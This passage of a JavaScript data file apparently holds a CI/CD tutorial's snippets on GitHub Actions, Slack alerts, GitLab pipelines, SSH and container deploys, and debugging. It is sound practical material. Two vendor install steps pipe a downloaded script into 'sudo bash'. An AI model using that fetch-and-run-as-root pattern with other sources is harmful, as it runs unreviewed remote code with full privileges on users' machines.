          note: 'if: always() uploads the report even when tests fail, which is when you most want it. Download it from the run\'s summary page.',
        },
        {
          title: 'Job summary with GITHUB_STEP_SUMMARY',
          lang: 'yaml',
          code: c`
            - name: Coverage summary
              if: always()
              run: |
                PCT=$(jq '.total.lines.pct' coverage/coverage-summary.json)
                {
                  echo "### Test results"
                  echo ""
                  echo "| Metric | Value |"
                  echo "|---|---|"
                  echo "| Line coverage | $PCT% |"
                  echo "| Commit | $GITHUB_SHA |"
                } >> "$GITHUB_STEP_SUMMARY"
            `,
          note: 'Anything written to the file in GITHUB_STEP_SUMMARY is rendered as Markdown on the run\'s summary page. coverage-summary.json comes from the json-summary reporter shown above.',
        },
        {
          title: 'Annotations',
          lang: 'bash',
          code: c`
            # inside a run step — shows on the PR's Files changed tab
            echo "::error file=src/api/orders.js,line=42,col=5,title=Lint::Unexpected console.log"
            echo "::warning file=app/Models/User.php,line=10::Deprecated method"
            echo "::notice::Coverage dropped from 84% to 81%"

            # group long output
            echo "::group::Installed packages"
            npm ls --depth=0
            echo "::endgroup::"
            `,
          note: 'setup-node already turns TypeScript (tsc) and ESLint\'s default output into annotations, and many test reporters can emit these commands directly. GitHub shows at most 10 errors and 10 warnings per step and 50 per job.',
        },
      ],
    },
    {
      id: 'rel-notifications',
      title: 'Notifications',
      group: 'Releases & quality',
      items: [
        {
          title: '1. Create a Slack incoming webhook',
          lang: 'text',
          code: c`
            https://api.slack.com/apps → Create New App → From scratch
              → Incoming Webhooks → Activate: On
              → Add New Webhook to Workspace → pick a channel (e.g. #deploys) → Allow
              → copy the URL: https://hooks.slack.com/services/T000/B000/XXXX
            `,
          note: 'Treat the webhook URL as a secret: anyone who has it can post to that channel.',
          then: [
            {
              label: 'Save it as a repository secret',
              lang: 'bash',
              code: c`
                # same on every OS (prompts for the value)
                gh secret set SLACK_WEBHOOK_URL --repo your-org/your-app
                `,
            },
          ],
        },
        {
          title: '2. Post to Slack when a step fails',
          lang: 'yaml',
          code: c`
            - name: Notify Slack on failure
              if: failure()
              env:
                SLACK_WEBHOOK_URL: ${GH} secrets.SLACK_WEBHOOK_URL }}
                RUN_URL: ${GH} github.server_url }}/${GH} github.repository }}/actions/runs/${GH} github.run_id }}
              run: |
                TEXT=":x: $GITHUB_WORKFLOW failed on $GITHUB_REF_NAME by $GITHUB_ACTOR
                $RUN_URL"
                jq -n --arg text "$TEXT" '{text: $text}' |
                  curl -sS --fail -X POST -H 'Content-Type: application/json' --data @- "$SLACK_WEBHOOK_URL"
            `,
          note: 'Put this as the last step of the job. failure() is true when any earlier step in the job failed; jq builds the JSON so quotes in branch names cannot break it.',
        },
        {
          title: '3. One notify job for the whole workflow',
          lang: 'yaml',
          code: c`
            jobs:
              # ...test and deploy jobs above...
              notify:
                needs: [test, deploy]
                if: failure()
                runs-on: ubuntu-latest
                steps:
                  - env:
                      SLACK_WEBHOOK_URL: ${GH} secrets.SLACK_WEBHOOK_URL }}
                      RUN_URL: ${GH} github.server_url }}/${GH} github.repository }}/actions/runs/${GH} github.run_id }}
                    run: |
                      jq -n --arg text ":x: Deploy of $GITHUB_REF_NAME failed: $RUN_URL" '{text: $text}' |
                        curl -sS --fail -X POST -H 'Content-Type: application/json' --data @- "$SLACK_WEBHOOK_URL"
            `,
          note: 'In a job with needs, failure() is true when any of the listed jobs (or the jobs they depend on) failed. Use always() instead to report every result, success included, and read each outcome from the needs context.',
        },
        {
          title: 'Test the webhook from your machine',
          lang: 'bash',
          code: c`
            # macOS / Linux
            curl -sS -X POST -H 'Content-Type: application/json' \
              --data '{"text":"Hello from CI"}' \
              "https://hooks.slack.com/services/T000/B000/XXXX"
            `,
          note: 'Use your real webhook URL. Slack replies with ok when the message was posted.',
          then: [
            {
              label: 'Windows (PowerShell)',
              lang: 'powershell',
              code: c`
                Invoke-RestMethod -Method Post ${BT}
                  -Uri 'https://hooks.slack.com/services/T000/B000/XXXX' ${BT}
                  -ContentType 'application/json' ${BT}
                  -Body '{"text":"Hello from CI"}'
                `,
            },
          ],
        },
        {
          title: 'Email defaults',
          lang: 'text',
          code: c`
            github.com → avatar → Settings → Notifications → System → Actions
              [x] Email
              [x] Only notify for failed workflows
            `,
          note: 'GitHub already emails the person who triggered a run when it fails; for scheduled workflows it emails the person who last edited the cron line. Each developer controls this in their own settings, so use Slack for team-wide alerts.',
        },
      ],
    },
    {
      id: 'gl-basics',
      title: 'GitLab CI basics',
      group: 'GitLab CI',
      items: [
        {
          title: 'Pipeline structure',
          lang: 'yaml',
          code: c`
            # .gitlab-ci.yml in the repo root
            stages:              # run in this order; jobs in the same stage run in parallel
              - build
              - test
              - deploy

            default:
              image: node:24     # Docker image for every job that doesn't set its own

            variables:
              NODE_ENV: test

            build:
              stage: build
              script:
                - npm ci
                - npm run build

            test:
              stage: test
              script:
                - npm ci
                - npm test
            `,
          note: 'Every top-level key that is not a reserved keyword (such as stages, default, variables, workflow or include) is a job, and a job needs at least a script. Keys starting with a dot are hidden templates, not jobs. Build > Pipeline editor in GitLab validates the file before you commit it.',
        },
        {
          title: 'Choose when jobs run with rules',
          lang: 'yaml',
          code: c`
            workflow:                     # pipeline level: no duplicate branch + MR pipelines
              rules:
                - if: $CI_PIPELINE_SOURCE == "merge_request_event"
                - if: $CI_COMMIT_BRANCH && $CI_OPEN_MERGE_REQUESTS
                  when: never
                - if: $CI_COMMIT_BRANCH
                - if: $CI_COMMIT_TAG

            test:
              script: npm test
              rules:
                - if: $CI_PIPELINE_SOURCE == "merge_request_event"
                - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH

            release:
              script: ./release.sh
              rules:
                - if: $CI_COMMIT_TAG =~ /^v\d+/
            `,
          note: 'Rules are checked top to bottom and the first match wins; if nothing matches, the job is left out of the pipeline. The workflow block stops a push to a branch with an open merge request from starting two pipelines.',
        },
        {
          title: 'Variables and secrets',
          lang: 'yaml',
          code: c`
            variables:                    # in the file: non-secret config only
              APP_ENV: testing
              DB_HOST: mysql

            test:
              variables:
                LOG_LEVEL: debug          # job level overrides global
              script:
                - echo "Branch $CI_COMMIT_BRANCH, commit $CI_COMMIT_SHORT_SHA"
                - ./notify.sh --token "$DEPLOY_TOKEN"    # defined in the UI, never in the file
            `,
          note: 'A protected variable is empty on unprotected branches by design, which is the usual reason a deploy job works on main but not on a feature branch. Masking needs a single-line value of at least 8 characters.',
          then: [
            {
              label: 'Settings > CI/CD > Variables > Add variable',
              lang: 'text',
              code: c`
                Type:         Variable   (or File: the job gets a path to a temp file holding the value)
                Environments: production (only jobs with environment: production receive it)
                Visibility:   Masked     (printed as [MASKED] in job logs)
                Flags:        [x] Protect variable   (only pipelines on protected branches / tags get it)
                Key:          DEPLOY_TOKEN
                Value:        ****************
                `,
            },
          ],
        },
        {
          title: 'Cache vs artifacts',
          lang: 'yaml',
          code: c`
            build:
              stage: build
              cache:                      # speed-up only: may be missing, never depend on it
                key:
                  files: [package-lock.json]
                paths: [.npm/]
              script:
                - npm ci --cache .npm --prefer-offline
                - npm run build
              artifacts:                  # job output: guaranteed to reach later jobs
                paths: [dist/]
                expire_in: 1 week

            deploy:
              stage: deploy
              script:
                - ls dist/                # artifacts from earlier stages are downloaded automatically
            `,
          note: 'Use cache for things you can rebuild (downloaded packages) and artifacts for things a later job needs (build output, test reports). Cache paths must be inside the project directory.',
        },
        {
          title: 'Run jobs out of stage order with needs',
          lang: 'yaml',
          code: c`
            lint:
              stage: test
              needs: []                   # starts immediately, does not wait for build
              script: npm run lint

            unit:
              stage: test
              needs: [build]              # starts as soon as build finishes
              script: npm test

            deploy:
              stage: deploy
              needs:
                - job: build
                  artifacts: true         # download build's artifacts
                - job: unit
                  artifacts: false        # just wait for it
              script: ./deploy.sh
            `,
          note: 'needs turns the pipeline into a graph: a job starts when the jobs it lists finish, not when the whole previous stage finishes. A job with needs only downloads artifacts from the jobs it lists, and needs: [] downloads none.',
        },
        {
          title: 'Install and register your own runner (optional)',
          lang: 'bash',
          code: c`
            # macOS
            brew install gitlab-runner
            gitlab-runner register --url https://gitlab.com --token glrt-xxxxxxxxxxxx
            brew services start gitlab-runner

            # Linux (Ubuntu / Debian)
            curl -L "https://packages.gitlab.com/install/repositories/runner/gitlab-runner/script.deb.sh" | sudo bash
            sudo apt-get install -y gitlab-runner
            sudo gitlab-runner register --url https://gitlab.com --token glrt-xxxxxxxxxxxx
            sudo gitlab-runner status                    # the package installs and starts the service
            `,
          note: 'GitLab.com hosted runners cover most projects; a self-hosted runner is for private networks or special hardware. Create the token in Settings > CI/CD > Runners > New project runner. register asks for an executor: pick docker (docker-windows on Windows) so image: works, and install Docker on that machine first.',
          then: [
            {
              label: 'Windows (PowerShell as Administrator)',
              lang: 'powershell',
              code: c`
                New-Item -ItemType Directory -Force C:\GitLab-Runner
                Invoke-WebRequest -Uri "https://gitlab-runner-downloads.s3.amazonaws.com/latest/binaries/gitlab-runner-windows-amd64.exe" -OutFile C:\GitLab-Runner\gitlab-runner.exe
                cd C:\GitLab-Runner
                .\gitlab-runner.exe register --url https://gitlab.com --token glrt-xxxxxxxxxxxx
                .\gitlab-runner.exe install
                .\gitlab-runner.exe start
                `,
            },
          ],
        },
      ],
    },
    {
      id: 'gl-stacks',
      title: 'GitLab CI per stack',
      group: 'GitLab CI',
      items: [
        {
          title: 'Laravel with a MySQL service',
          lang: 'yaml',
          code: c`
            laravel-test:
              stage: test
              image: php:8.3-cli
              services:
                - mysql:8.4               # reachable at host "mysql"
              variables:
                MYSQL_DATABASE: testing   # read by the mysql container
                MYSQL_ROOT_PASSWORD: secret
                DB_CONNECTION: mysql      # read by Laravel (real env vars beat .env)
                DB_HOST: mysql
                DB_DATABASE: testing
                DB_USERNAME: root
                DB_PASSWORD: secret
              cache:
                key:
                  files: [composer.lock]
                paths: [vendor/]
              before_script:
                - apt-get update && apt-get install -y git unzip
                - curl -sSLf -o /usr/local/bin/install-php-extensions https://github.com/mlocati/docker-php-extension-installer/releases/latest/download/install-php-extensions
                - chmod +x /usr/local/bin/install-php-extensions
                - install-php-extensions pdo_mysql zip bcmath @composer
              script:
                - cp .env.example .env
                - composer install --no-interaction --prefer-dist --no-progress
                - php artisan key:generate
                - php artisan migrate --force
                - php artisan test
            `,
          note: 'Variables defined in the file are passed to service containers too, so one block configures both MySQL and Laravel. The extension install runs on every job, so for speed build your own CI image with these extensions and use it as image.',
        },
        {
          title: 'Node',
          lang: 'yaml',
          code: c`
            node-test:
              stage: test
              image: node:24
              cache:
                key:
                  files: [package-lock.json]
                paths: [.npm/]
              script:
                - npm ci --cache .npm --prefer-offline
                - npm run lint
                - npm test
            `,
          note: 'Cache the npm download cache (.npm) rather than node_modules; npm ci deletes node_modules first anyway.',
        },
        {
          title: 'Python with a Postgres service',
          lang: 'yaml',
          code: c`
            python-test:
              stage: test
              image: python:3.12
              services:
                - postgres:17             # reachable at host "postgres"
              variables:
                POSTGRES_DB: app_test
                POSTGRES_USER: app
                POSTGRES_PASSWORD: secret
                DATABASE_URL: postgresql://app:secret@postgres:5432/app_test
                PIP_CACHE_DIR: $CI_PROJECT_DIR/.cache/pip
              cache:
                key:
                  files: [requirements.txt]
                paths: [.cache/pip]
              script:
                - pip install -r requirements.txt
                - pytest
            `,
          note: 'The service hostname is the image name without the tag (postgres), unless you set an alias. PIP_CACHE_DIR moves the pip cache into the project folder so GitLab can cache it.',
        },
        {
          title: 'React (Vite) build as an artifact',
          lang: 'yaml',
          code: c`
            build-frontend:
              stage: build
              image: node:24
              variables:
                VITE_API_URL: https://api.example.com   # baked into the bundle at build time
              cache:
                key:
                  files: [package-lock.json]
                paths: [.npm/]
              script:
                - npm ci --cache .npm --prefer-offline
                - npm run build
              artifacts:
                paths: [dist/]
                expire_in: 1 week
            `,
          note: 'Later jobs (tests, deploy) get dist/ automatically. Anything prefixed VITE_ ends up in public JavaScript, so never put secrets there.',
        },
        {
          title: 'Test reports and coverage in merge requests',
          lang: 'yaml',
          code: c`
            node-test:
              stage: test
              image: node:24
              script:
                - npm ci
                - npx vitest run --coverage --reporter=default --reporter=junit --outputFile.junit=junit.xml
              coverage: '/All files[^|]*\|[^|]*\s+([\d\.]+)/'
              artifacts:
                when: always              # upload reports even when tests fail
                reports:
                  junit: junit.xml
                  coverage_report:
                    coverage_format: cobertura
                    path: coverage/cobertura-coverage.xml
            `,
          note: 'Failed tests then show in the merge request widget, and changed lines get coverage marks in the diff. Vitest needs a coverage provider and the text and cobertura reporters enabled in its config.',
          then: [
            {
              label: 'vitest.config.js (after npm install -D @vitest/coverage-v8)',
              lang: 'js',
              code: c`
                import { defineConfig } from 'vitest/config'

                export default defineConfig({
                  test: {
                    coverage: {
                      provider: 'v8',
                      reporter: ['text', 'cobertura'],   // text feeds the coverage: regex, cobertura the MR diff
                    },
                  },
                })
                `,
            },
            {
              label: 'Python (pytest + pytest-cov)',
              lang: 'yaml',
              code: c`
                python-test:
                  script:
                    - pytest --junitxml=report.xml --cov --cov-report=term --cov-report=xml
                  coverage: '/TOTAL.*\s+(\d+%)$/'
                  artifacts:
                    when: always
                    reports:
                      junit: report.xml
                      coverage_report:
                        coverage_format: cobertura
                        path: coverage.xml
                `,
            },
          ],
        },
      ],
    },
    {
      id: 'gl-deploy',
      title: 'GitLab deploy & environments',
      group: 'GitLab CI',
      items: [
        {
          title: '1. Create a deploy key',
          lang: 'bash',
          code: c`
            # same on every OS (OpenSSH ships with Windows 10+); press Enter twice for no passphrase
            ssh-keygen -t ed25519 -C "gitlab-deploy" -f deploy_key

            # macOS / Linux
            ssh-keyscan -H 203.0.113.10 > known_hosts
            ssh-keygen -lf known_hosts                   # compare with the server's fingerprint (below)
            ssh-copy-id -i deploy_key.pub deploy@203.0.113.10
            `,
          note: 'ssh-keyscan trusts whatever answers at that address, so check the fingerprint against the server before you store it. The deploy user only needs access to /var/www/app, not sudo.',
          then: [
            {
              label: 'Windows (PowerShell)',
              lang: 'powershell',
              code: c`
                ssh-keyscan -H 203.0.113.10 | Out-File -Encoding ascii known_hosts
                ssh-keygen -lf known_hosts
                Get-Content deploy_key.pub | ssh deploy@203.0.113.10 "mkdir -p ~/.ssh && chmod 700 ~/.ssh && cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
                `,
            },
            {
              label: 'On the server: show the real host key fingerprint',
              lang: 'bash',
              code: c`
                ssh-keygen -lf /etc/ssh/ssh_host_ed25519_key.pub
                `,
            },
          ],
        },
        {
          title: '2. Add protected CI/CD variables',
          lang: 'text',
          code: c`
            Settings > CI/CD > Variables

            Key               Type      Value                         Flags
            SSH_PRIVATE_KEY   File      contents of deploy_key        Protected, environment: production
            SSH_KNOWN_HOSTS   File      contents of known_hosts       Protected
            DEPLOY_HOST       Variable  203.0.113.10                  Protected
            `,
          note: 'A private key is multi-line, so it cannot be masked; protecting it and scoping it to the production environment keeps it out of feature-branch jobs. Paste the whole key including the BEGIN and END lines and make sure the value ends with a newline, or ssh reports an invalid format. Delete the local deploy_key once it is stored.',
        },
        {
          title: '3. SSH deploy job with a manual button',
          lang: 'yaml',
          code: c`
            .ssh:                         # hidden template job (name starts with a dot)
              image: alpine:3.20
              before_script:
                - apk add --no-cache openssh-client rsync
                - mkdir -p ~/.ssh && chmod 700 ~/.ssh
                - cp "$SSH_KNOWN_HOSTS" ~/.ssh/known_hosts
                - chmod 600 "$SSH_PRIVATE_KEY"

            deploy-production:
              extends: .ssh
              stage: deploy
              environment:
                name: production
                url: https://example.com
              rules:
                - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
                  when: manual
              script:
                - ssh -i "$SSH_PRIVATE_KEY" -o BatchMode=yes deploy@$DEPLOY_HOST "cd /var/www/app && bash deploy.sh"
            `,
          note: 'File-type variables hold a path, which is why the key is used with -i instead of echoed. A manual job defined in rules blocks the pipeline until someone presses play; add allow_failure: true if the pipeline should finish green without it.',
          then: [
            {
              label: 'Deploy the React build from gl-stacks with rsync (rsync must be installed on the server too)',
              lang: 'yaml',
              code: c`
                deploy-frontend:
                  extends: .ssh
                  stage: deploy
                  needs: [build-frontend]     # downloads its dist/ artifact
                  environment:
                    name: production
                    url: https://example.com
                  rules:
                    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
                      when: manual
                  script:
                    - rsync -az --delete -e "ssh -i $SSH_PRIVATE_KEY -o BatchMode=yes" dist/ deploy@$DEPLOY_HOST:/var/www/app/public/
                `,
            },
          ],
        },
        {
          title: 'Build and push to the GitLab Container Registry',
          lang: 'yaml',
          code: c`
            docker-build:
              stage: build
              image: docker:27
              services:
                - docker:27-dind
              variables:
                DOCKER_TLS_CERTDIR: "/certs"
              before_script:
                - echo "$CI_REGISTRY_PASSWORD" | docker login -u "$CI_REGISTRY_USER" --password-stdin "$CI_REGISTRY"
              script:
                - docker build -t "$CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA" -t "$CI_REGISTRY_IMAGE:latest" .
                - docker push --all-tags "$CI_REGISTRY_IMAGE"
              rules:
                - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
            `,
          note: 'CI_REGISTRY, CI_REGISTRY_USER, CI_REGISTRY_PASSWORD and CI_REGISTRY_IMAGE are predefined, so no secrets are needed; the password is a short-lived job token piped to --password-stdin, never printed. Docker-in-Docker needs a privileged runner, which GitLab.com hosted runners provide.',
        },
        {
          title: 'Pull the new image on the server',
          lang: 'bash',
          code: c`
            # on the server (Linux), once, as the deploy user (who must be in the docker group).
            # Create a deploy token in Settings > Repository > Deploy tokens with scope read_registry,
            # then paste the token when prompted (keeps it out of shell history):
            docker login registry.gitlab.com -u your-deploy-token-username
            `,
          note: 'The login is saved in the deploy user\'s Docker config, so later pulls from CI over SSH need no credentials. The deploy job reuses the .ssh template from step 3.',
          then: [
            {
              label: '/var/www/app/compose.yaml',
              lang: 'yaml',
              code: c`
                services:
                  app:
                    image: registry.gitlab.com/your-org/your-app:latest
                    restart: unless-stopped
                    ports:
                      - "127.0.0.1:8080:8080"
                `,
            },
            {
              label: 'Deploy job',
              lang: 'yaml',
              code: c`
                deploy-container:
                  extends: .ssh
                  stage: deploy
                  needs: [docker-build]
                  environment:
                    name: production
                    url: https://example.com
                  rules:
                    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
                      when: manual
                  script:
                    - ssh -i "$SSH_PRIVATE_KEY" -o BatchMode=yes deploy@$DEPLOY_HOST "cd /var/www/app && docker compose pull && docker compose up -d"
                `,
            },
          ],
        },
        {
          title: 'Stop overlapping deploys and protect production',
          lang: 'yaml',
          code: c`
            deploy-production:
              resource_group: production  # one deploy at a time; later ones wait
              environment:
                name: production
            `,
          note: 'Protect main in Settings > Repository > Protected branches so only maintainers can merge, which also limits who gets protected variables. On Premium, Settings > CI/CD > Protected environments restricts who can press the deploy button, and Operate > Environments lets you re-run an older deployment to roll back.',
        },
      ],
    },
    {
      id: 'fix-debug',
      title: 'Debugging failed runs',
      group: 'Troubleshooting',
      items: [
        {
          title: 'Read only the failing logs',
          lang: 'bash',
          code: c`
            # same on every OS (GitHub CLI)
            gh run list --limit 5                        # recent runs with IDs and status
            gh run list --workflow ci.yml --branch main
            gh run view 1234567890                       # jobs and steps of one run
            gh run view 1234567890 --log-failed          # logs of the failed steps only
            gh run view 1234567890 --job 9876543210 --log
            gh run watch 1234567890                      # follow a run live
            `,
          note: 'Start with the first error in the log, not the last; later failures are often side effects. The run and job IDs are also in the URL of the run page.',
        },
        {
          title: 'Re-run failed jobs',
          lang: 'bash',
          code: c`
            # same on every OS
            gh run rerun 1234567890 --failed             # failed jobs and the jobs that depend on them
            gh run rerun 1234567890 --failed --debug     # same, with debug logging for this attempt
            gh run rerun --job 9876543210                # one job
            gh run rerun 1234567890                      # the whole run
            `,
          note: 'A re-run uses the same commit and the same workflow file, so it only helps with flaky or external failures. To test a fix, push a new commit.',
          then: [
            {
              label: 'GitLab (glab CLI, same on every OS)',
              lang: 'bash',
              code: c`
                glab ci status                               # pipeline for the current branch
                glab ci trace 9876543210                     # stream a job log
                glab ci retry 9876543210                     # retry a job
                `,
            },
          ],
        },
        {
          title: 'Turn on debug logging',
          lang: 'bash',
          code: c`
            # same on every OS: repository secrets (or variables) with exactly these names
            gh secret set ACTIONS_STEP_DEBUG --body true      # extra debug output from every step
            gh secret set ACTIONS_RUNNER_DEBUG --body true    # runner diagnostic logs in the log archive

            # turn it off again
            gh secret delete ACTIONS_STEP_DEBUG
            gh secret delete ACTIONS_RUNNER_DEBUG
            `,
          note: 'Debug logs are long, so turn them on for one investigation and off again. Re-running with debug logging from the UI or with --debug does the same for a single attempt without changing settings.',
          then: [
            {
              label: 'GitLab equivalent (exposes secrets in the log; remove after use)',
              lang: 'yaml',
              code: c`
                test:
                  variables:
                    CI_DEBUG_TRACE: "true"    # prints every shell command with expanded variables
                `,
            },
          ],
        },
        {
          title: 'Print what the job actually sees',
          lang: 'yaml',
          code: c`
                  - name: Debug info
                    if: failure()                # runs only when an earlier step failed
                    env:
                      EVENT_JSON: ${GH} toJSON(github.event) }}
                    run: |
                      pwd && ls -la
                      node --version && npm --version
                      env | sort | grep -viE 'token|secret|password|key'
                      echo "$EVENT_JSON" | head -50
                      df -h
            `,
          note: 'Passing context through env instead of writing the expression inside run avoids script injection from branch names or PR titles. GitHub masks secrets in logs, but filter them out anyway.',
        },
        {
          title: 'Run GitHub workflows locally with act',
          lang: 'bash',
          code: c`
            # macOS
            brew install act

            # Linux (Ubuntu / Debian)
            curl --proto '=https' --tlsv1.2 -sSf https://raw.githubusercontent.com/nektos/act/master/install.sh | sudo bash -s -- -b /usr/local/bin

            # Windows (PowerShell)
            winget install nektos.act

            # usage, same on every OS (Docker must be running)
            act -l                                       # list the jobs act found
            act                                          # simulate a push
            act pull_request
            act -j test                                  # one job
            act -s GITHUB_TOKEN="$(gh auth token)"       # pass a secret
            act --secret-file .secrets                   # KEY=value lines; keep .secrets in .gitignore
            act --container-architecture linux/amd64     # Apple Silicon: match the x64 GitHub runners
            `,
          note: 'act runs each job in a Docker container that is close to, but not the same as, the GitHub runner, so some actions and services behave differently. It is best for fast feedback on syntax, scripts and job wiring; SSH-into-the-runner debugging actions are not a substitute worth the risk.',
        },
        {
          title: 'Reproduce inside the same image',
          lang: 'bash',
          code: c`
            # macOS / Linux
            docker run --rm -it -v "$PWD":/app -v /app/node_modules -w /app node:24 bash

            # then, inside the container, run the job's commands one by one
            npm ci
            npm test
            `,
          note: 'Use the exact image tag from the job (GitLab image:, or a GitHub container: job). The extra /app/node_modules volume keeps Linux packages from overwriting the ones on your machine. For GitHub ubuntu-latest jobs, ubuntu:24.04 is the closest public base.',
          then: [
            {
              label: 'Windows (PowerShell)',
              lang: 'powershell',
              code: c`
                docker run --rm -it -v "$($PWD.Path):/app" -v /app/node_modules -w /app node:24 bash
                `,
            },
          ],
        },
      ],
    },
    {
      id: 'fix-common',
      title: 'Common failures and fixes',
      group: 'Troubleshooting',
      items: [
        {
          title: 'Symptom, cause, fix',
          lang: 'text',
          code: c`
            SYMPTOM                                    CAUSE -> FIX
            Permission denied (publickey)              server lacks the public key, wrong user, or the secret lost its
                                                       BEGIN/END lines or final newline -> paste the whole key again;
                                                       check ~/.ssh is 700 and authorized_keys is 600 on the server
            Host key verification failed               known_hosts is empty in CI -> store ssh-keyscan output as a
                                                       secret and write it to ~/.ssh/known_hosts (do not disable
                                                       StrictHostKeyChecking)
            403 / "Permission ... denied to            GITHUB_TOKEN is read-only -> permissions: contents: write;
             github-actions[bot]" on push               also check branch protection and repo workflow permissions
            "Not authorized to perform                 trust policy sub does not match the token -> compare with
             sts:AssumeRoleWithWebIdentity"             repo:your-org/your-app:ref:refs/heads/main (environment jobs
                                                       send :environment:production); needs id-token: write
            Cache never hits                           key changes every run (github.sha, date) or path differs ->
                                                       key on hashFiles(lockfile), add restore-keys
            Connection refused to mysql / postgres     tests start before the service is ready -> health checks on
                                                       the service; steps on the runner use 127.0.0.1 + mapped port
            Works locally, fails in CI                 missing env var or secret; Linux paths are case-sensitive
                                                       (./Button vs ./button); CRLF in .sh files ("bad interpreter:
                                                       ^M"); script missing the executable bit
            npm ci: package.json and                   lockfile out of date -> npm install locally with the same
             package-lock.json are not in sync          Node / npm major version, commit package-lock.json
            No space left on device                    big images and build caches -> df -h, prune Docker, delete
                                                       unused toolchains on hosted runners
            `,
        },
        {
          title: 'SSH: write the key and known_hosts correctly',
          lang: 'yaml',
          code: c`
                  - name: Set up SSH
                    env:
                      SSH_KEY: ${GH} secrets.DEPLOY_SSH_KEY }}
                      KNOWN_HOSTS: ${GH} secrets.DEPLOY_KNOWN_HOSTS }}
                    run: |
                      mkdir -p ~/.ssh && chmod 700 ~/.ssh
                      printf '%s\n' "$SSH_KEY" > ~/.ssh/id_ed25519
                      chmod 600 ~/.ssh/id_ed25519
                      printf '%s\n' "$KNOWN_HOSTS" > ~/.ssh/known_hosts
                      ssh -o BatchMode=yes deploy@203.0.113.10 true   # fail fast with a clear error
            `,
          note: 'printf adds the trailing newline OpenSSH needs, and passing secrets through env keeps them out of the generated script. If the key still fails, check the server side: the reason for a rejection is in the SSH log.',
          then: [
            {
              label: 'On the server (Ubuntu / Debian)',
              lang: 'bash',
              code: c`
                sudo cat /home/deploy/.ssh/authorized_keys        # is the public key there?
                sudo chmod 700 /home/deploy/.ssh
                sudo chmod 600 /home/deploy/.ssh/authorized_keys
                sudo chown -R deploy:deploy /home/deploy/.ssh
                sudo journalctl -u ssh -f                         # watch the rejection reason live (sshd on RHEL)
                `,
            },
          ],
        },
        {
          title: '403 on push or release: grant token permissions',
          lang: 'yaml',
          code: c`
            permissions:
              contents: write          # push commits / tags, create releases
              pull-requests: write     # comment on PRs
              packages: write          # push images to ghcr.io
              id-token: write          # OIDC login to AWS / GCP
            `,
          note: 'Grant only what a job needs, at job level where possible. Settings > Actions > General > Workflow permissions caps the maximum, and pull requests from forks always get a read-only token. Do not switch to pull_request_target to get a write token: it runs with secrets, so it must never check out or run code from the pull request.',
        },
        {
          title: 'OIDC: make the trust policy match the sub claim',
          lang: 'json',
          code: c`
            {
              "Version": "2012-10-17",
              "Statement": [
                {
                  "Effect": "Allow",
                  "Principal": {
                    "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
                  },
                  "Action": "sts:AssumeRoleWithWebIdentity",
                  "Condition": {
                    "StringEquals": {
                      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
                    },
                    "StringLike": {
                      "token.actions.githubusercontent.com:sub": [
                        "repo:your-org/your-app:ref:refs/heads/main",
                        "repo:your-org/your-app:environment:production"
                      ]
                    }
                  }
                }
              ]
            }
            `,
          note: 'A job with environment: production sends the environment form of sub, not the branch form, which is the most common mismatch. Owner and repo names are case-sensitive here.',
          then: [
            {
              label: 'Workflow side',
              lang: 'yaml',
              code: c`
                permissions:
                  id-token: write          # without this, no OIDC token is issued
                  contents: read

                jobs:
                  deploy:
                    runs-on: ubuntu-latest
                    environment: production  # sub = repo:your-org/your-app:environment:production
                    steps:
                      - uses: aws-actions/configure-aws-credentials@v4
                        with:
                          role-to-assume: arn:aws:iam::123456789012:role/github-deploy
                          aws-region: us-east-1
                      - run: aws sts get-caller-identity
                `,
            },
          ],
        },
        {
          title: 'Wait for services with health checks',
          lang: 'yaml',
          code: c`
                services:
                  mysql:
                    image: mysql:8.4
                    env:
                      MYSQL_ROOT_PASSWORD: secret
                      MYSQL_DATABASE: testing
                    ports: ['3306:3306']
                    options: >-
                      --health-cmd="mysqladmin ping -h 127.0.0.1"
                      --health-interval=10s --health-timeout=5s --health-retries=10
                  postgres:
                    image: postgres:17
                    env:
                      POSTGRES_PASSWORD: secret
                    ports: ['5432:5432']
                    options: >-
                      --health-cmd="pg_isready -U postgres"
                      --health-interval=10s --health-timeout=5s --health-retries=10
            `,
          note: 'GitHub waits until health checks pass before running steps. Steps run on the runner, so connect to 127.0.0.1 and the mapped port; only jobs that run in a container: reach services by name.',
        },
        {
          title: 'Fix CRLF, executable bit and filename case',
          lang: 'text',
          code: c`
            # .gitattributes
            * text=auto eol=lf
            *.sh text eol=lf
            *.bat text eol=crlf
            *.ps1 text eol=crlf
            `,
          note: 'macOS and Windows file systems ignore case and Windows ignores the executable bit, so these mistakes only show up on the Linux runner. Fix them in Git itself, not just on disk.',
          then: [
            {
              label: 'Apply it (same on every OS)',
              lang: 'bash',
              code: c`
                git add --renormalize .
                git update-index --chmod=+x deploy.sh               # store the executable bit
                git mv src/components/button.jsx src/components/Button.jsx
                git commit -m "Normalize line endings, fix file mode and case"
                `,
            },
          ],
        },
        {
          title: 'Free disk space on hosted runners',
          lang: 'yaml',
          code: c`
                  - name: Free disk space
                    run: |
                      df -h /
                      sudo rm -rf /usr/share/dotnet /usr/local/lib/android /opt/ghc /opt/hostedtoolcache/CodeQL
                      docker system prune -af
                      df -h /
            `,
          note: 'Removing toolchains you do not use frees many GB on ubuntu-latest. On self-hosted runners, schedule a Docker prune instead, since old images and build cache pile up across jobs.',
        },
      ],
    },
    {
      id: 'fix-fast',
      title: 'Make pipelines fast and cheap',
      group: 'Troubleshooting',
      items: [
        {
          title: 'Cache dependencies and Docker layers',
          lang: 'yaml',
          code: c`
                  - uses: actions/setup-node@v4
                    with:
                      node-version: 24
                      cache: npm                 # keyed on package-lock.json

                  - uses: actions/setup-python@v5
                    with:
                      python-version: '3.12'
                      cache: pip

                  - uses: docker/setup-buildx-action@v3
                  - uses: docker/build-push-action@v6
                    with:
                      push: true
                      tags: ghcr.io/your-org/your-app:latest
                      cache-from: type=gha
                      cache-to: type=gha,mode=max
            `,
